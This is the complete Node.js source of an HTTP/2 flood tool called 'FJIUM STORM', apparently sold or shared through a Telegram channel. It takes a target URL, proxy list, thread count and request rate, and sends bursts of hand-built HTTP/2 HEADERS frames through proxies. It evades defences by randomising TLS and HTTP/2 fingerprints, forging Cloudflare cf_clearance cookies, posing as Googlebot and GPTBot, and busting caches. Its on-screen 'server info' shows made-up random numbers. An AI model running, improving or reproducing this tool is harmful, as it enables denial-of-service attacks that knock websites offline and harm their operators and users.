const args = process.argv.slice(2);
const colors = require('colors');
const net = require("net");
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const os = require("os");
const v8 = require('v8');
const HPACK = require('hpack');

// Increase the libuv threadpool size to enhance asynchronous processing performance
process.env.UV_THREADPOOL_SIZE = os.cpus().length * 4;

// List of error names and codes to ignore to prevent console logging
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

// Handle errors to prevent program crashes
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).setMaxListeners(0);

// Retrieve command-line arguments
const target = process.argv[2]; // Target URL
const duration = parseInt(process.argv[3]); // Attack duration (seconds)
const threads = parseInt(process.argv[4]); // Number of threads
const rps = parseInt(process.argv[5]); // Requests per second
const proxyFile = process.argv[6]; // Proxy list file
const debugIndex = args.indexOf('--debug');
const debugMode = debugIndex !== -1; // Debug mode to display status codes
const cacheIndex = args.indexOf('--cache');
const enableCache = cacheIndex !== -1; // Enable cache bypass technique
const fullIndex = args.indexOf('--full');
const isFull = fullIndex !== -1; // Attack for large backends (Amazon, Akamai, Cloudflare)
const fakeBotIndex = args.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && args[fakeBotIndex + 1] && args[fakeBotIndex + 1].toLowerCase() === 'true'; // Use bot User-Agent
const bfmIndex = args.indexOf('--bfm');
const bfmFlag = bfmIndex !== -1 && args[bfmIndex + 1] ? args[bfmIndex + 1].toLowerCase() === 'true' : false; // Enable bot fight mode bypass
const cookieIndex = args.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < args.length ? args[cookieIndex + 1] : null; // Custom cookie

// Validate input parameters
if (!target || !duration || !threads || !rps || !proxyFile) {
    console.error(`\x1b[38;2;128;0;128m Telegram:\x1b[0m t.me/vladimir_cnc1 | \x1b[38;2;128;0;128m BYPASS - Update:\x1b[0m 17/10/2025`);
    console.error(` Usage: \n\x1b[38;2;0;255;0m node ${process.argv[1]} <url> <duration> <threads> <rps> <proxyFile>\x1b[0m  \n\x1b[38;5;1m Options:\x1b[0m
  \x1b[38;2;80;80;220m --fakebot true/false\x1b[0m - Use bot User-Agent (TelegramBot, GPTBot, GoogleBot, etc.)\n \x1b[38;2;80;80;220m --cache\x1b[0m - Enable cache bypass techniques \n  \x1b[38;2;80;80;220m --full\x1b[0m - Attack for big backends (Amazon, Akamai, Cloudflare)\n  \x1b[38;2;80;80;220m --bfm true/null\x1b[0m - Enable bypass bot fight mode\n  \x1b[38;2;80;80;220m --cache\x1b[0m - Enable cache bypass techniques\n  \x1b[38;2;80;80;220m --cookie\x1b[0m "f=f" - Custom cookie, supports %RAND% ex: "bypassing=%RAND%"\n  \x1b[38;2;80;80;220m --debug \x1b[0m- Show status codes`);
    process.exit(1);
}

if (!/^https?:\/\//i.test(target)) {
    console.error('URL must start with http:// or https://');
    process.exit(1);
}

if (isNaN(rps) || rps <= 0) {
    console.error('RPS must be a positive number');
    process.exit(1);
}

if (!fs.existsSync(proxyFile)) {
    console.error('Proxy file does not exist');
    process.exit(1);
}

// Read and filter valid proxies from the proxy file
const proxies = fs.readFileSync(proxyFile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
    const [host, port] = line.split(':');
    return host && port && !isNaN(port);
});
if (proxies.length === 0) {
    console.error('No valid proxies found');
    process.exit(1);
}

// List of HTTP methods
const methods = ["GET", "POST", "HEAD"];

// List of TLS ciphers
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    defaultCiphers[0], defaultCiphers[1], defaultCiphers[2], defaultCiphers[3], ...defaultCiphers.slice(3),
].join(":");

// List of signature algorithms
const signatureAlgorithms = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

// List of ciphers for TLS
const cipherList = [
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'
];

// List of Accept headers
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];

// List of Cache-Control headers
const cacheHeaders = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
];

// List of User-Agents
const userAgents = [
    `Mozilla/5.0 (Windows NT ${getRandomInt(1, 11)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${getRandomInt(10, 18)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS ${getRandomInt(10, 17)}_${getRandomInt(0, 4)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(10, 17)}.0 Mobile/15E148 Safari/604.1`,
    `Mozilla/5.0 (iPad; CPU OS ${getRandomInt(10, 17)}_${getRandomInt(0, 7)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(10, 17)}.0 Mobile/15E148 Safari/604.1`
];

// List of bot User-Agents
const botUserAgents = [
    'TelegramBot (like TwitterBot)',
    'GPTBot/1.0 (+https://openai.com/gptbot)',
    'GPTBot/1.1 (+https://openai.com/gptbot)',
    'OAI-SearchBot/1.0 (+https://openai.com/searchbot)',
    'ChatGPT-User/1.0 (+https://openai.com/bot)',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Googlebot-Image/1.0',
    'Googlebot-Video/1.0',
    'Googlebot-News/2.1',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/W.X.Y.Z Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Twitterbot/1.0',
    'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
    'Slackbot',
    'Discordbot/2.0 (+https://discordapp.com)',
    'DiscordBot (private use)'
];

// List of encoding headers
const encodings = [
    'gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip',
    'gzip, br', 'gzip, deflate', 'gzip, zstd', 'br, deflate', 'br, zstd', 'deflate, zstd'
];

// Function to select random header values
const headerFunctions = {
    cipher() {
        return cipherList[Math.floor(Math.random() * cipherList.length)];
    },
    signatureAlgorithms() {
        return signatureAlgorithms[Math.floor(Math.random() * signatureAlgorithms.length)];
    },
    accept() {
        return acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)];
    },
    cache() {
        return cacheHeaders[Math.floor(Math.random() * cacheHeaders.length)];
    },
    encoding() {
        return encodings[Math.floor(Math.random() * encodings.length)];
    }
};

// Function to generate cf_clearance cookie for bot fight mode bypass
function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randomString(16);
    const version = getRandomInt(17494, 17500);
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}`)
        .digest('hex')
        .substring(0, 16);
    return `cf_clearance=${clientId}.${challengeId}-${version}.${timestamp}.${hashPart}`;
}

// Function to generate random string
function randomString(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// Function to generate random query string
function generateRandomQueryString(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

// Function to get random integer in range
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Function to generate random delay
function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Function to shuffle object headers
function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}

// Function to generate cache bypass query
function generateCacheQuery() {
    return `?cache=${randomString(8)}`;
}

// Function to encode HTTP/2 frame
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) {
        frame = Buffer.concat([frame, payload]);
    }
    return frame;
}

// Function to decode HTTP/2 frame
function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset !== length) {
            return null;
        }
    }
    return { streamId, length, type, flags, payload };
}

// Function to encode HTTP/2 settings
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

// Function to generate HTTP/2 fingerprint
function generateHTTP2Fingerprint() {
    const settings = {
        HEADER_TABLE_SIZE: [4096, 16384],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [100, 500],
        INITIAL_WINDOW_SIZE: [65535, 262144],
        MAX_FRAME_SIZE: [16384, 65536],
        MAX_HEADER_LIST_SIZE: [8192, 32768],
        ENABLE_CONNECT_PROTOCOL: [0, 1]
    };
    const http2Settings = {};
    for (const [key, values] of Object.entries(settings)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }
    return http2Settings;
}

// Function to count and display response status
const statusCounts = {};
function countStatus(status) {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
}

// Function to colorize status codes
function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524'];
    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = colors.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = colors.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = colors.yellow.bold(status);
    } else {
        coloredStatus = colors.gray.bold(status);
    }
    const underlinedCount = colors.underline(count);
    return `${coloredStatus}: ${underlinedCount}`;
}

// Function to check ping to target
function httpPing(url) {
    try {
        const client = http2.connect(url);
        const startTime = Date.now();
        const parsedUrl = new URL(url);
        const req = client.request({
            ':method': 'GET',
            ':authority': parsedUrl.host,
            ':scheme': 'https',
            ':path': parsedUrl.pathname
        });
        req.once('response', (headers, flags) => {
            const duration = Date.now() - startTime;
            let message = '';
            if (headers[':status'] === 403) {
                message = 'Ping blocked';
            } else if (headers[':status'] === 429) {
                message = 'Ping rate-limited';
            } else if (duration > 22000) {
                message = 'Timed out';
            } else {
                message = `Received ping response in ${duration}ms`;
            }
            process.stdout.cursorTo(0, 7);
            process.stdout.clearLine();
            process.stdout.write(`${message}     `);
            req.end();
            client.close();
        });
        req.once('error', () => {
            client.close();
        });
        req.end();
    } catch (e) {
        process.stdout.cursorTo(0, 7);
        process.stdout.clearLine();
        console.log(`Error: ${e.message}`);
    }
}

// Main flood function
async function flood() {
    const [proxyHost, proxyPort] = proxies[~~(Math.random() * proxies.length)].split(':');
    let tlsSocket;
    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
        flood();
        return;
    }
    const parsed = url.parse(target);
    let path = parsed.path;
    if (parsed.path.includes('%rand%')) {
        path = parsed.path.replace("%rand%", generateRandomQueryString(5, 7));
    } else if (enableCache) {
        path = parsed.path + generateCacheQuery();
    }
    const nodeVersion = getRandomInt(128, 129);
    const sigalgs = headerFunctions.signatureAlgorithms();
    let cookie = cookieValue ? cookieValue : '';
    if (bfmFlag) {
        cookie = cookie ? `${cookie}; ${generateCfClearanceCookie()}` : generateCfClearanceCookie();
    }
    const userAgent = fakeBot ? botUserAgents[Math.floor(Math.random() * botUserAgents.length)] : userAgents[Math.floor(Math.random() * userAgents.length)];
    const http2Fingerprint = generateHTTP2Fingerprint();
    let hpack = new HPACK();
    hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);
    let headers = [
        [":method", enableCache ? methods[Math.floor(Math.random() * methods.length)] : "GET"],
        [":authority", parsed.host],
        [":scheme", "https"],
        [":path", path],
        ["upgrade-insecure-requests", "1"],
        ["sec-fetch-mode", "navigate"],
        ["sec-fetch-dest", "document"],
        ["cookie", cookie],
        ["cache-control", enableCache ? headerFunctions.cache() : 'no-cache'],
        ["sec-ch-ua", `"Chromium";v="${nodeVersion}", "Not=A?Brand";v="0", "Google Chrome";v="${nodeVersion}"`],
        ["sec-ch-ua-platform", "Linux-x86"],
        ["sec-ch-ua-mobile", "?0"],
        ["sec-fetch-user", "?1"],
        ["accept", headerFunctions.accept()],
        ["user-agent", userAgent],
        ["accept-language", "en-US,en;q=0.9,vi;q=0.8"],
        ["accept-encoding", headerFunctions.encoding()],
        ["purpure-secretf-id", "formula-" + generateRandomQueryString(1, 5)],
        ["priority", `u=${getRandomInt(1, 5)}, i`],
        ["sec-fetch-site", "none"]
    ];
    if (Math.random() >= 0.5) {
        headers.push(...[
            ...(Math.random() < 0.6 ? [["rush-combo", "zero-" + generateRandomQueryString(1, 5)]] : []),
            ...(Math.random() < 0.6 ? [["rush-xjava", "router-" + generateRandomQueryString(1, 5)]] : []),
            ...(Math.random() < 0.6 ? [["rush-combo-javax", "zero-" + generateRandomQueryString(1, 5)]] : []),
            ...(Math.random() < 0.6 ? [["c-xjava" + generateRandomQueryString(1, 2), "router-" + generateRandomQueryString(1, 5)]] : [])
        ]);
    }
    const dataFloor = Math.floor(Math.random() * 3);
    let windowSize, rada;
    switch (dataFloor) {
        case 0:
            windowSize = 6291456 + 65535;
            rada = 128;
            break;
        case 1:
            windowSize = 6291456 - 65535;
            rada = 256;
            break;
        case 2:
            windowSize = 6291456 + 65535 * 4;
            rada = 1;
            break;
    }
    const TLS_OPTIONS = {
        ciphers: headerFunctions.cipher(),
        sigalgs: sigalgs,
        minVersion: "TLSv1.3",
        ecdhCurve: 'secp256r1:X25519',
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2', 'http/1.1'],
        requestOCSP: true,
        minDHSize: 2048
    };
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(15663105, 0);
    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([
            [1, http2Fingerprint.HEADER_TABLE_SIZE],
            [2, http2Fingerprint.ENABLE_PUSH],
            [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
            [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
            [5, http2Fingerprint.MAX_FRAME_SIZE],
            [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
            [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
        ])),
        encodeFrame(0, 8, updateWindow)
    ];
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nConnection: Keep-Alive\r\n\r\n`);
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ...TLS_OPTIONS,
                servername: parsed.host
            }, () => {
                let streamId = 1;
                let data = Buffer.alloc(0);
                tlsSocket.write(Buffer.concat(frames));
                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')?.[1];
                                if (status) countStatus(status);
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                closeConnections(null, netSocket, tlsSocket);
                                flood();
                            }
                        } else {
                            break;
                        }
                    }
                });
                const client = http2.connect(parsed.href, {
                    settings: {
                        headerTableSize: http2Fingerprint.HEADER_TABLE_SIZE,
                        initialWindowSize: http2Fingerprint.INITIAL_WINDOW_SIZE,
                        maxHeaderListSize: http2Fingerprint.MAX_HEADER_LIST_SIZE,
                        enablePush: http2Fingerprint.ENABLE_PUSH,
                        enableConnectProtocol: http2Fingerprint.ENABLE_CONNECT_PROTOCOL,
                        maxConcurrentStreams: http2Fingerprint.MAX_CONCURRENT_STREAMS
                    }
                }, (session) => {
                    session.setLocalWindowSize(windowSize);
                });
                client.on("error", () => {
                    closeConnections(client, netSocket, tlsSocket);
                });
                client.on("close", () => {
                    closeConnections(client, netSocket, tlsSocket);
                });
                client.on("connect", async () => {
                    const interval = setInterval(async () => {
                        for (let i = 0; i < (isFull ? rps * 4 : rps); i++) {
                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(headers)
                            ]);
                            const encodedFrame = encodeFrame(streamId, 1, packed, 0x25);
                            tlsSocket.write(encodedFrame);
                            streamId += 2;
                        }
                    }, randomDelay(500, 1000));
                    client.on("close", () => {
                        clearInterval(interval);
                    });
                }).on("error", () => {
                    closeConnections(client, netSocket, tlsSocket);
                });
            }).on('error', () => {
                closeConnections(null, netSocket, tlsSocket);
            });
        });
    }).on('error', () => {
        closeConnections(null, netSocket, tlsSocket);
    }).on('close', () => {
        closeConnections(null, netSocket, tlsSocket);
        flood();
    });
}

// Function to close connections
function closeConnections(client, netSocket, tlsSocket) {
    if (client) client.destroy();
    if (netSocket) netSocket.destroy();
    if (tlsSocket) tlsSocket.destroy();
}

// Cluster management
const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 10;

if (cluster.isMaster) {
    function readServerInfo() {
        const load = (Math.random() * 100).toFixed(2);
        const memory = (Math.random() * 16).toFixed(2);
        const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok', hour: '2-digit', minute: '2-digit', second: '2-digit' });
        process.stdout.cursorTo(0, 6);
        process.stdout.clearLine();
        process.stdout.write(`[!] FJIUM STORM Info: CPU Load: ${load}%, Memory Usage: ${memory}GB, Time: ${currentTime}`.bgRed);
    }

    setInterval(readServerInfo, 1000);
    if (debugMode) {
        setInterval(() => {
            const statusString = Object.entries(statusCounts)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            console.clear();
            console.log(`[${colors.magenta.bold('FJIUM STORM')}] | Date: [${colors.blue.bold(new Date().toLocaleString('en-US'))}] | Status: [${statusString}]`);
            Object.keys(statusCounts).forEach(status => {
                statusCounts[status] = 0;
            });
        }, 1000);
    }

    console.clear();
    console.log(
        '   /\\'.red + '\n' +
        '  /  \\'.yellow + '\n' +
        ' / /\\ \\'.magenta + '\n' +
        '/_/  \\_\\'.blue
    );
    console.log('HEAP SIZE:', (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2), 'MB');

    const updateLoading = (percentage, delay) => {
        setTimeout(() => {
            process.stdout.cursorTo(0, 5);
            process.stdout.write(`Loading: ${percentage}%`.green);
        }, delay);
    };

    updateLoading(10, 0);
    updateLoading(50, 500 * duration);
    updateLoading(100, duration * 1000);

    const restartScript = () => {
        Object.values(cluster.workers).forEach(worker => worker.kill());
        console.log(`[<>] Restarting...`);
        setTimeout(() => {
            for (let i = 0; i < threads; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`[<!>] RAM usage exceeds limit`);
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 1000);
    setInterval(() => httpPing(target), 5000);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => { console.clear(); process.exit(-1); }, duration * 1000);
} else {
    setInterval(() => {
        for (let i = 0; i < 16; i++) {
            flood();
        }
    }, randomDelay(500, 1000));
}